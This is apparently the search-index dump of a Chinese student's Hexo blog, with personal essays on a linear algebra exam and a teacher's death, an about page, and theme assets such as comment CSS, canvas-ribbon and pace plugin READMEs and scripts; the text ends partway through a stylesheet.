关于线代期末\n\n学期开头线代老师的浓厚湖南农村口音就给我来了当头一棒，这是**导火索**。\n线代教材编的一坨根本看不懂在讲什么，这是**直接原因**。\n然后我就走上了线代纯自学的道路...上课？周四的早八，本来就不想去上课，还是早八，非常没有激情...\n每天周三晚上都要绝望地想到明天是**线代周四早八**。\n\n本来看的是[一高数](https://www.bilibili.com/video/BV1Et421E7jk/)老师的自学课，老师讲的非常好，<small>*为我的4小时速成打下了坚实的基础...*</small>，唯一的缺点可能就是涉及题型比较少，导致我大多数是懂了公式怎么用...\n后来实在觉得我不理解线性代数这玩意，特别是向量空间那一章节，我又尝试用[Gilbert Strang](https://www.bilibili.com/video/BV16Z4y1U7oU)这位MIT教授的课来辅助我理解...嗯，理解了，结合Geogebra的3D计算器，我倒是知道那一堆莫名其妙的公式是怎么来的了...也对线代是个几何的东西有了一点点模糊的概念，更能理解矩阵了...\n**然后我开始做往年期末题，然后悲伤地发现，这对我的期末考试不太有作用。**\n我只是在理解线代，但是期末考试告诉我，我需要做题，需要记得那些东西来做题，需要变换成我熟悉的形式做题。\n**然后我投降了...像无数个抱佛脚的学生一样，我打开了4小时速成课程，开始看题型，解题技巧...** [这是我的做题笔记狼狈痕迹](https://1drv.ms/o/c/710350be48682818/EuYPgNiLM95FmpclHifiq_MBPq2eDeFJHwAVrwKt7TJOKw?e=SwqLuM)\n还好，结局是好的。也许我确实幸运，线代考的很简单，我甚至提前一小时就写完了（都是我看的速成课的题目，做的相当快），然后剩下一小时就是反复重新算行列式和矩阵乘法，生怕算错...最后实在算了十遍后确认无误后，提前十分钟交卷了。\n\n或许这线代中我的表现就像我之前看到的那一句话一样吧。“中国大学生的期末，就是一个学期的努力，考前几天的焦虑，考前一天的速记和考场上的看运气。”\n哈哈，又看到一句“前十七周告诉你我是大学生，第十八周告诉你我为什么是大学生。”\n\n不过一天复习一门还是特别累的...十一点高数考完，睡到下午两点<small>(*大学生特有的特爱睡觉*)</small>。然后打开手机，焦虑刷手机，看到有人推荐课程，然后下午四点开始看，走走停停学到晚上十一点...\n还是很奇妙的，短短五小时的课程知识量吸收那么多，学之前是线性方程组都不知道怎么求解的菜鸡，学之后我都可以提醒室友复习遗漏的东西了...压力果然还是足以驱动懒人的不可或缺的力啊。\n\n### 关于线代老师...\n#### 恶\n其实一开学我听着老师*亲切的*乡音我还是很抵触的...班上外省的同学立马反馈根本听不懂老师讲课，我倒是听得懂，但是他让我想起我小学一位数学老师，用方言讲课...然后那一次小学的数学成绩就开始急转直下，又如蝴蝶效应一般影响到了以后的数学学习兴趣...加上老师开学第一课就是念ppt，也不讲原理，我也看不懂线代教材的开局行列式怎么来的...学完一节课我感觉跟没学一样，让我内心还是很抵触的。厌屋及乌一般，对线代不感冒了，觉得学线代是一件很痛苦的事情...然后也觉得老师怎么这样，然后对老师也有了偏见...\n**其实不仅我这样，大家似乎也是这样。**\n我经常看校园集市，能看到很多人的求助帖，其中很常见的就是关于老师选择的求助帖。**我看见有人询问线代老师推荐**，我本来想回复一位我觉得教学水平很高超，讲解很容易理解的老师<small>（给来HNU的学生推荐一下，是朱郁森老师）</small>,但是看见评论区像乐子人一般推荐我的这位线代老师的时候...其实内心很复杂。一方面，是我觉得他们很坏，给一个求助帖推荐这位讲话都让人听不懂的老师...另一方面，我也心里默认了，这位老师==差老师。\n**人是会被舆论一直影响下去的，这是一件很恐怖的事情。**\n我一开始只是对老师有一点点的不信任，但无伤大雅，这不影响我来上课的心情。**但是看到大家都说这个老师极差的时候，我还是被舆论牵着走了。**\n我也加入了评价的大众里，我对老师的恶意进一步了。\n我也开始随波逐流，一同攻击这位老师。我向室友明里暗里地抱怨老师实在是太差，影响了我的线代学习...甚至我上课的动力也被影响，一看到那位老师的名字就感觉不舒服...\n\n**但是，真的是这样吗？这位老师，实在是不堪吗？这位老师，是我期末线代不会写的元凶吗？**\n\n**<big>傲慢催生退步，这是个很简单的道理。</big>**\n\n#### 清醒\n一切只是发生在一个上午。元旦之后，我的（非同专业）室友突然问我：“你知道你每天抱怨的那个线代老师去世了吗？”\n一切太突然，我根本没有思想准备。在我的认识里，老师只是请了两周的假，我根本不知道，也没有去在乎老师的身体的身体状态。\n和我一起上课的室友告诉我，她发现老师上一次的课就很不对劲了，平时说话一惊一乍的很大声的老师，那一次上课却一直坐在讲台旁的凳子上，声音也很小，她根本听不清。大家都以为老师只是在这流感多发的季节生了流感，这一切很正常，我们都知道，老师在感冒好了之后就会回来继续教学的，然后**我们会继续过着自学听线代的日子**。\n\n但是不可能了。助教正式发来通知。\n![助教说](/images/tired/线代助教通知.png)\n![学生与另一位老师的聊天记录](/images/tired/周老师去世.jpg)\n\n其实知道的那一瞬间，我就清醒起来了。\n我想到我的室友跟我说的话。“我觉得周老师其实没有那么差，他很好的。”过去我被傲慢的认知给蒙蔽，没把这句话当回事，但现在我却能清晰想起来这句话。\n**为什么？**\n我这么问自己。\n或许，是清醒了吧。\n犹如被浇上一盆冷水，所有人都开始审视自己了。也许是死者为大带来的影响，也许是真的认识到了自己过去的错误...\n但不管怎么样，大家都清醒了。\n**但不管怎么样，周老师已经不在了。**\n\n人总是被舆论牵着走，打破这个局面的，往往是像这样，死生一般重大的事情。\n**人，要有自己的判断。人，要清醒下去。**\n这也是周老师真正给我上的，我在线代老师中唯一真正学到的，也是我一生中或许学到的最重要的道理。\n\n最后，附上一位周老师学生的悼唁吧。\n![一位周老师的学生](/images/tired/周老师学生.png)\n愿大家都平安顺遂，愿癌症不再带去任何一个人的生命。\n周老师，一路走好。","tags":["编程","杂谈","期末"],"categories":["杂谈"]},{"title":"第一篇","url":"/2025/01/10/sheng-huo/ji-lu/di-yi-pian/","content":"突发奇想，大半夜的，点开了一位学长的博客，然后想着自己也能不能写一个博客...然后就这样跟着教程开始了。\n\n可能有人说，我怎么半夜三点突然说要写个博客，还要搭个网站...，我只能说，有时候人就是这么无聊吧，一个人坐在可以通宵的自习室里，只有一个人的时候也因为环境而睡不着，就会做些对现在“没有意义”的事情...\n\n有人说，为什么不去期末复习？下一周就是期末周，有很多期末考试....只能说实在是没兴趣将时间花在复习上了，高三那个复习已经让我认清了，连靠着老师一轮二轮到三轮，我始终是：题目知识点会的都会写，不会的基本都不会写，更别提到了大学了...上课认真听应付那个高数题（我上课听高数听的认真些），期末基本都会...但线代实在是靠自学，加上自己没什么驱动力，线代学的一坨大便。倒也不至于挂科什么的，但就是写起来不是很爽，如此循环，没了兴趣。\n\n然后就开始做有兴趣的事情了。随手打开一篇之前打校CTF无意间搜到HNU信安学长的博客 “我为何想建立HNU信安交流群” 。见： [学长博客链接](https://mo-xiaoxi.github.io/2016/05/30/HnuSec/)，再看一遍，有了好多新的收获。\n\n就说里面简单的一例，学长说HNU的信安学习氛围不足，我也切身感受到了...不像ACM那边，校训队加吴昊老师作为金牌教练的气氛烘托还进了几次world final，在HNU信安的CTF我连校队都没见到消息过...大家都是大一，看HNU的ACM好像很厉害，大家都在往那边发展去了，刷算法，做程序题，打codeforces啊牛客啊什么的...就连程序设计这门课程，有好几次作业都不像是基础题，像是从算法题里面摘下来给我们做的，一看老师讲解，一看是oier才常用的知识...哎，理解信安本来人数基数就少，招生也很少，只是为了学计算机的，或者来不了计科电气调剂来信安的...都来了。然后就发现，大家都对信安好像...没有概念？不能说没有兴趣，提到网安大家都是想到黑客，黑客很酷，也有兴趣，但真正来参与行动的，一起讨论CTF的，真的太少太少了...打场校赛，赛事群里100多号人，来打的新生就20多个人...大家都不愿意尝试，因为没接触过，甚至没了解过...因为没了解过，所以更不敢尝试了。然后带来的是信安氛围更不足的萧瑟...\n\n有点迷茫。我想试试CTF，因为我觉得它真的很有趣...但我又不知道我下一步往哪里走。我是信息安全专业的大学生，但我首先是个大学生，我得先保证我的课程任务，我不能落下什么...除此之外，孤独也是我的迷雾...我在学校里也没找到什么同年级的同好，又胆怯于主动社交于学长学姐（我承认这是我的一个缺点，但从小到大都是这样...），又找不到可以指引我走的可以交流的老师，真的很迷茫...我只能一遍遍的自己私下做一些CTF的练习，对，练习，不是训练，一点一点啜饮一些知识...\n\n我有时候也在想，我才大一，甚至才大一上册，对一切迷茫很正常，不必要太追求什么东西，该来的总是会来的。但我也在想，我既然是大一，那我也要好好看看大一我能做什么吧，多做一点，这样以后的空闲就更多一点（虽然可能是个无底洞了哈哈哈），然后我可以把这些空闲的时间，用来发呆，用来看AI写故事，用来呼呼大睡去梦里玩，甚至像这样做有兴趣的事情，一点一点做些我舒适的事情...一点一点收集我自己的小快乐。\n\n我还是像过去一样期待着未来。\n","tags":["杂谈"],"categories":["杂谈"]},{"url":"/Templates/Addimages.html","content":"![image](images/{{tp.file.title}}/{{tp.date.now(\"YYYYMMDD-HHMMSS\")}}.png)"},{"title":"<% tp.file.title %>","url":"/Templates/hexo-template.html","content":"# <% tp.file.title %>\n\n\n\n"},{"title":"关于","url":"/about/index.html","content":"# 你好，我是Moyuin。\n**缥缈，游荡，没有来路与归处。**\n## About me\n- HNU信息安全专业大一学生。\n- ISTP,但不探讨MBTI。\n- 喜欢书写故事，但又较为懒惰。\n- HFA患者，鲜与人接触，也没有与人接触的想法。\n- 希望与众不同。\n\n## About blog\n- 一些**生活杂谈**💭\n一般想到什么写什么，我的文字比较抽离飘渺...\n一般会在备忘录里写，后来发现写在博客里还更有意义一些，以后想不起来还可以看。\n对生活不爽就会写点东西。\n\n- 一些**日志记录**📓\n主要是日记形式的：\n  - 可能记下一些自己很惊叹的东西...那些别人的人生照片，或者觉得很好看的摄影作品。\n  - 或者看了书，一些思考...虽然我现在看书看的少，总是读快餐文学。\n  - 或是什么听到了直击心灵的歌曲，记录下听歌的感受，情感。\n  - 或者做到了什么很不一样的事情，记录下来。\n\n- 一些**学习日志**📰\n    - 和同学完成的学习报告，是有真实成分的，我上传上去永久保存！\n    - 自己写的报告，比如之前比赛的wp，或者总结什么的...哪天想起哪天传。\n\n## 为什么要写在博客里？\n答案很简单：**觉得有一个自己的博客网站特别帅😎**\n还有看了很多学长学姐也有自己的博客，自己也想试试，恰好，我能做到，为什么不这么做呢？\n以前总是写在qq空间里，但随着人加的越来越多，自己也沉默起来了。\n现在有了这个小网站，刚好有一个**只要我不分享给别人，别人就不知道这个发牢骚的人在现实里是谁**的机会。\n主要还是记录给自己看。\n这里作为自己在**这互联网天地的一部分**，或许也是个归处。\n\n## 联系方式\n- 📧 邮箱：[me@moyuin.top](mailto:me@moyuin.top)\n- 🐱 GitHub: [Moyuin](https://github.com/Moyuin-aka)\n\n\n\n\n\n\n"},{"title":"分类","url":"/categories/index.html"},{"title":"推荐","url":"/link/index.html","content":"\n"},{"title":"搜索","url":"/search/index.html"},{"title":"标签","url":"/tags/index.html"},{"url":"/css/custom/twikoo_beautify.css","content":"/* 自定义twikoo评论输入框高度 */\n.tk-input.el-textarea__inner {\n    height: 130px !important;\n  }\n  /* 输入评论时自动隐藏输入框背景图片 */\n  .tk-input.el-textarea__inner:focus {\n    background-image: none !important;\n  }\n  /* 调整楼中楼样式 ，整体左移，贴合气泡化效果 */\n  .tk-replies {\n    left: -70px;\n    width: calc(100% + 70px);\n  }\n  /* 头像宽度调整 rem单位与全局字体大小挂钩，需配合自己情况调整大小以保证头像显示完整*/\n  .tk-avatar {\n    width: 3rem !important;\n    height: 3rem !important;\n  }\n  .tk-avatar img {\n    width: 3rem !important;\n    height: 3rem !important;\n  }\n  /* 回复框左移，避免窄屏时出框 */\n  .tk-comments-container .tk-submit {\n    position: relative;\n    left: -70px;\n  }\n  /* 评论块气泡化修改 */\n  .tk-content {\n    background: #8b8b8b; /*默认模式访客气泡配色*/\n    padding: 10px;\n    left: 8px;\n    color: #fff; /*默认模式访客气泡字体配色*/\n    border-radius: 10px;\n    font-size: 16px !important;\n    width: fit-content;\n    max-width: 100%;\n    position: relative !important;\n    overflow: visible !important;\n    max-height: none !important;\n  }\n  /* 修复图片出框 */\n  .tk-content img {\n    max-width: 100% !important;\n  }\n  /* 修复过长文本出框 */\n  .tk-content pre {\n    white-space: pre-wrap;\n    word-wrap: break-word;\n  }\n  .tk-content a {\n    color: #eeecaa; /*默认模式超链接配色*/\n  }\n  .tk-content p {\n    margin-top: 0px;\n    margin-bottom: 0px;\n  }\n  .tk-content::before {\n    content: \"\";\n    width: 0;\n    height: 0;\n    position: absolute;\n    top: 20px;\n    left: -13px;\n    border-top: 2px solid transparent;\n    border-bottom: 20px solid transparent;\n    border-right: 15px solid #8b8b8b; /*默认模式访客气泡小三角配色*/\n    border-left: 0px solid transparent;\n  }\n  .tk-master .tk-content {\n    background: #ff8080; /*默认模式博主气泡配色*/\n    color: #fff; /*默认模式博主气泡字体配色*/\n    width: fit-content;\n    max-width: 100%;\n    left: 9px;\n  }\n  .tk-master .tk-content a {\n    color: #eeecaa;\n  }\n  .tk-master .tk-content::before {\n    content: \"\";\n    width: 0;\n    height: 0;\n    position: absolute;\n    top: 20px;\n    left: -13px;\n    border-top: 2px solid transparent;\n    border-bottom: 20px solid transparent;\n    border-right: 15px solid #ff8080; /*默认模式博主气泡小三角配色*/\n    border-left: 0px solid transparent;\n  }\n  .tk-row[data-v-d82ce9a0] {\n    max-width: 100%;\n    width: fit-content;\n    margin-left: 10px;\n  }\n  .tk-avatar {\n    border-radius: 50%;\n    margin-top: 40px;\n  }\n  .tk-master .tk-avatar {\n    position: relative;\n    left: 6px;\n  }\n  \n  /* 夜间模式配色，具体比照上方默认模式class */\n  [data-theme=\"dark\"] .tk-content {\n    background: #1d1d1f;\n    color: #fff;\n  }\n  [data-theme=\"dark\"] .tk-content a {\n    color: #dfa036;\n  }\n  [data-theme=\"dark\"] .tk-content::before {\n    border-right: 15px solid #1d1d1f;\n  }\n  [data-theme=\"dark\"] .tk-master .tk-content {\n    background: #1c1c1e;\n    color: #fff;\n  }\n  [data-theme=\"dark\"] .tk-master .tk-content a {\n    color: #dfa036;\n  }\n  [data-theme=\"dark\"] .tk-master .tk-content::before {\n    border-top: 2px solid transparent;\n    border-bottom: 20px solid transparent;\n    border-right: 15px solid #1c1c1e;\n    border-left: 0px solid transparent;\n  }\n  \n  .tk-master .tk-extras {\n    float: left;\n    margin-left: 10px;\n  }\n  .tk-extras {\n    margin-left: 10px;\n  }\n  \n  .tk-comments-title[data-v-2619081a] {\n    margin-bottom: 0px;\n  }\n  \n  /* 自适应内容 */\n  @media screen and (min-width: 1024px) {\n    /* 设置宽度上限，避免挤压博主头像 */\n    .tk-content {\n      max-width: 75%;\n      width: fit-content;\n    }\n    .tk-master .tk-content {\n      width: fit-content;\n      float: right;\n      margin-right: 110px;\n    }\n    .tk-master .tk-content::before {\n      left: 100%;\n      border-left: 15px solid #ff8080;\n      border-right: 0px solid transparent;\n    }\n    .tk-master .tk-avatar {\n      position: relative;\n      left: calc(75% + 120px);\n    }\n    .tk-master .tk-row[data-v-d82ce9a0] {\n      position: relative;\n      top: 0px;\n      /* left: calc(55%); */\n      float: right;\n      margin-right: 100px;\n      margin-left: 200px;\n    }\n    .tk-master .tk-content[data-v-d82ce9a0] {\n      margin-top: 5px;\n    }\n    .tk-master .tk-extras {\n      float: right;\n      margin-right: 100px;\n      margin-left: 200px;\n    }\n    [data-theme=\"dark\"] .tk-master .tk-content::before {\n      border-left: 15px solid #1c1c1e;\n      border-right: 0px solid transparent;\n    }\n  }"},{"url":"/lib/canvas-ribbon/README.html","content":"<h1 align=\"center\"><a href=\"https://github.com/hustcc/ribbon.js\">canvas-ribbon.js</a> for <a href=\"https://github.com/theme-next\">NexT</a></h1>\n\n<h1 align=\"center\">Installation</h1>\n\n<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>\n\n<h2 align=\"center\">Step 1 &rarr; Go to NexT dir</h2>\n\nChange dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:\n\n```sh\n$ cd themes/next\n$ ls\n_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source\n```\n\n<h2 align=\"center\">Step 2 &rarr; Get module</h2>\n\nInstall module to `source/lib` directory:\n\n```sh\n$ git clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n```\n\n<h2 align=\"center\">Step 3 &rarr; Set it up</h2>\n\nEnable module in **NexT** `_config.yml` file:\n\n```yml\ncanvas_ribbon:\n  enable: true\n```\n\n**And, if you wants to use the CDN, then need to set:**\n\n```yml\nvendors:\n  ...\n  canvas_ribbon: //cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js\n```\n\n<h1 align=\"center\">Update</h1>\n\n```sh\n$ cd themes/next/source/lib/canvas-ribbon\n$ git pull\n```\n"},{"url":"/lib/canvas-ribbon/canvas-ribbon.js","content":"/**\n * Copyright (c) 2016 hustcc\n * License: MIT\n * Version: v1.0.1\n * GitHub: https://github.com/hustcc/ribbon.js\n**/\n/*jshint -W030 */\n! function() {\n  function attr(node, attr, default_value) {\n    return Number(node.getAttribute(attr)) || default_value;\n  }\n\n  // get user config\n  var scripts = document.getElementsByTagName('script'),\n    script = scripts[scripts.length - 1]; // 当前加载的script\n  config = {\n    z: attr(script, \"zIndex\", -1), // z-index\n    a: attr(script, \"alpha\", 0.6), // alpha\n    s: attr(script, \"size\", 90), // size\n  };\n\n  var canvas = document.createElement('canvas'),\n    g2d = canvas.getContext('2d'),\n    pr = window.devicePixelRatio || 1,\n    width = window.innerWidth,\n    height = window.innerHeight,\n    f = config.s,\n    q, t,\n    m = Math,\n    r = 0,\n    pi = m.PI*2,\n    cos = m.cos,\n    random = m.random;\n  canvas.width = width * pr;\n  canvas.height = height * pr;\n  g2d.scale(pr, pr);\n  g2d.globalAlpha = config.a;\n  canvas.style.cssText = 'opacity: ' + config.a + ';position:fixed;top:0;left:0;z-index: ' + config.z + ';width:100%;height:100%;pointer-events:none;';\n  // create canvas\n  document.getElementsByTagName('body')[0].appendChild(canvas);\n\n  function redraw() {\n    g2d.clearRect(0, 0, width, height);\n    q = [{x: 0, y: height * 0.7 + f}, {x: 0, y: height * 0.7 - f}];\n    while(q[1].x < width + f) draw(q[0], q[1]);\n  }\n  function draw(i, j) {\n    g2d.beginPath();\n    g2d.moveTo(i.x, i.y);\n    g2d.lineTo(j.x, j.y);\n    var k = j.x + (random()*2-0.25)*f, n = line(j.y);\n    g2d.lineTo(k, n);\n    g2d.closePath();\n    r -= pi / -50;\n    g2d.fillStyle = '#'+(cos(r)*127+128<<16 | cos(r+pi/3)*127+128<<8 | cos(r+pi/3*2)*127+128).toString(16);\n    g2d.fill();\n    q[0] = q[1];\n    q[1] = {x: k, y: n};\n  }\n  function line(p){\n    t = p + (random() * 2 - 1.1) * f;\n    return (t > height || t < 0) ? line(p) : t;\n  }\n\n  document.onclick = redraw;\n  document.ontouchstart = redraw;\n  redraw();\n}();\n"},{"url":"/lib/pace/README.html","content":"<h1 align=\"center\"><a href=\"https://github.com/HubSpot/pace\">Progress bar</a> for <a href=\"https://github.com/theme-next\">NexT</a></h1>\n\n<h1 align=\"center\">Installation</h1>\n\n<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>\n\n<h2 align=\"center\">Step 1 &rarr; Go to NexT dir</h2>\n\nChange dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:\n\n```sh\n$ cd themes/next\n$ ls\n_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source\n```\n\n<h2 align=\"center\">Step 2 &rarr; Get module</h2>\n\nInstall module to `source/lib` directory:\n\n```sh\n$ git clone https://github.com/theme-next/theme-next-pace source/lib/pace\n```\n\n<h2 align=\"center\">Step 3 &rarr; Set it up</h2>\n\nEnable module in **NexT** `_config.yml` file and select your theme:\n\n```yml\npace:\n  enable: true\n  # Themes list:\n  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple\n  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal\n  theme: minimal\n```\n\n**And, if you wants to use the CDN, then need to set:** (you also need to find your corresponding theme css link in <a href=\"https://www.jsdelivr.com/package/npm/pace-js?path=themes\">jsdelivr</a>)\n\n```yml\nvendors:\n  ...\n  pace: //cdn.jsdelivr.net/npm/pace-js@1/pace.min.js\n  pace_css: //cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css\n```\n\n<h1 align=\"center\">Update</h1>\n\n```sh\n$ cd themes/next/source/lib/pace\n$ git pull\n```\n"},{"url":"/lib/pace/pace-theme-barber-shop.min.css","content":".pace,.pace .pace-progress{width:100%;overflow:hidden}.pace,.pace .pace-activity{position:fixed;top:0;left:0}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;height:12px;background:#fff}.pace-inactive{display:none}.pace .pace-progress{background-color:#29d;position:fixed;top:0;bottom:0;right:100%}.pace .pace-activity{right:-32px;bottom:0;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);background-image:-webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,.2)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,.2)),color-stop(.75,rgba(255,255,255,.2)),color-stop(.75,transparent),to(transparent));background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:-moz-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);-webkit-background-size:32px 32px;-moz-background-size:32px 32px;-o-background-size:32px 32px;background-size:32px 32px;-webkit-animation:pace-theme-barber-shop-motion .5s linear infinite;-moz-animation:pace-theme-barber-shop-motion .5s linear infinite;-ms-animation:pace-theme-barber-shop-motion .5s linear infinite;-o-animation:pace-theme-barber-shop-motion .5s linear infinite;animation:pace-theme-barber-shop-motion .5s linear infinite}@-webkit-keyframes pace-theme-barber-shop-motion{0%{-webkit-transform:none;transform:none}100%{-webkit-transform:translate(-32px,0);transform:translate(-32px,0)}}@-moz-keyframes pace-theme-barber-shop-motion{0%{-moz-transform:none;transform:none}100%{-moz-transform:translate(-32px,0);transform:translate(-32px,0)}}@-o-keyframes pace-theme-barber-shop-motion{0%{-o-transform:none;transform:none}100%{-o-transform:translate(-32px,0);transform:translate(-32px,0)}}@-ms-keyframes pace-theme-barber-shop-motion{0%{-ms-transform:none;transform:none}100%{-ms-transform:translate(-32px,0);transform:translate(-32px,0)}}@keyframes pace-theme-barber-shop-motion{0%{transform:none}100%{transform:translate(-32px,0)}}"},{"url":"/lib/pace/pace-theme-big-counter.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace.pace-inactive .pace-progress{display:none}.pace .pace-progress{position:fixed;z-index:2000;top:0;right:0;height:5rem;width:5rem;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace .pace-progress:after{display:block;position:absolute;top:0;right:.5rem;content:attr(data-progress-text);font-family:\"Helvetica Neue\",sans-serif;font-weight:100;font-size:5rem;line-height:1;text-align:right;color:rgba(34,153,221,.19999999999999996)}"},{"url":"/lib/pace/pace-theme-bounce.min.css","content":".pace{width:140px;height:300px;position:fixed;top:-90px;right:-20px;z-index:2000;-webkit-transform:scale(0);-moz-transform:scale(0);-ms-transform:scale(0);-o-transform:scale(0);transform:scale(0);opacity:0;-webkit-transition:all 2s linear 0s;-moz-transition:all 2s linear 0s;transition:all 2s linear 0s}.pace.pace-active{-webkit-transform:scale(.25);-moz-transform:scale(.25);-ms-transform:scale(.25);-o-transform:scale(.25);transform:scale(.25);opacity:1}.pace .pace-activity{width:140px;height:140px;border-radius:70px;background:#29d;position:absolute;top:0;z-index:1911;-webkit-animation:pace-bounce 1s infinite;-moz-animation:pace-bounce 1s infinite;-o-animation:pace-bounce 1s infinite;-ms-animation:pace-bounce 1s infinite;animation:pace-bounce 1s infinite}.pace .pace-progress{position:absolute;display:block;left:50%;bottom:0;z-index:1910;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-webkit-transform:scaleY(.3)!important;-moz-transform:scaleY(.3)!important;-ms-transform:scaleY(.3)!important;-o-transform:scaleY(.3)!important;transform:scaleY(.3)!important;-webkit-animation:pace-compress .5s infinite alternate;-moz-animation:pace-compress .5s infinite alternate;-o-animation:pace-compress .5s infinite alternate;-ms-animation:pace-compress .5s infinite alternate;animation:pace-compress .5s infinite alternate}@-webkit-keyframes pace-bounce{0%,100%,95%{top:0;-webkit-animation-timing-function:ease-in}50%{top:140px;height:140px;-webkit-animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;-webkit-animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;-webkit-animation-timing-function:ease-out}}@-moz-keyframes pace-bounce{0%,100%,95%{top:0;-moz-animation-timing-function:ease-in}50%{top:140px;height:140px;-moz-animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;-moz-animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;-moz-animation-timing-function:ease-out}}@keyframes pace-bounce{0%,100%,95%{top:0;animation-timing-function:ease-in}50%{top:140px;height:140px;animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;animation-timing-function:ease-out}}@-webkit-keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-webkit-animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;-webkit-animation-timing-function:ease-out}}@-moz-keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-moz-animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;-moz-animation-timing-function:ease-out}}@keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;animation-timing-function:ease-out}}"},{"url":"/lib/pace/pace-theme-center-atom.min.css","content":".pace,.pace .pace-progress{z-index:2000;height:60px;width:100px}.pace .pace-activity,.pace .pace-progress:before{border-radius:50%;display:block;position:absolute}.pace.pace-inactive{display:none}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0}.pace .pace-progress{position:absolute;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace .pace-progress:before{content:attr(data-progress-text);text-align:center;color:#fff;background:#29d;font-family:\"Helvetica Neue\",sans-serif;font-size:14px;font-weight:100;line-height:1;padding:20% 0 7px;width:50%;height:40%;margin:10px 0 0 30px;z-index:999}.pace .pace-activity{font-size:15px;line-height:1;z-index:2000;-webkit-animation:pace-theme-center-atom-spin 2s linear infinite;-moz-animation:pace-theme-center-atom-spin 2s linear infinite;-o-animation:pace-theme-center-atom-spin 2s linear infinite;animation:pace-theme-center-atom-spin 2s linear infinite;border:5px solid #29d;content:' ';top:0;left:0;height:60px;width:100px}.pace .pace-activity:after,.pace .pace-activity:before{content:' ';display:block;position:absolute;top:-5px;left:-5px;height:60px;width:100px}.pace .pace-activity:after{border-radius:50%;border:5px solid #29d;-webkit-transform:rotate(60deg);-moz-transform:rotate(60deg);-o-transform:rotate(60deg);transform:rotate(60deg)}.pace .pace-activity:before{border-radius:50%;border:5px solid #29d;-webkit-transform:rotate(120deg);-moz-transform:rotate(120deg);-o-transform:rotate(120deg);transform:rotate(120deg)}@-webkit-keyframes pace-theme-center-atom-spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(359deg)}}@-moz-keyframes pace-theme-center-atom-spin{0%{-moz-transform:rotate(0)}100%{-moz-transform:rotate(359deg)}}@-o-keyframes pace-theme-center-atom-spin{0%{-o-transform:rotate(0)}100%{-o-transform:rotate(359deg)}}@keyframes pace-theme-center-atom-spin{0%{transform:rotate(0)}100%{transform:rotate(359deg)}}"},{"url":"/lib/pace/pace-theme-center-circle.min.css","content":".pace,.pace 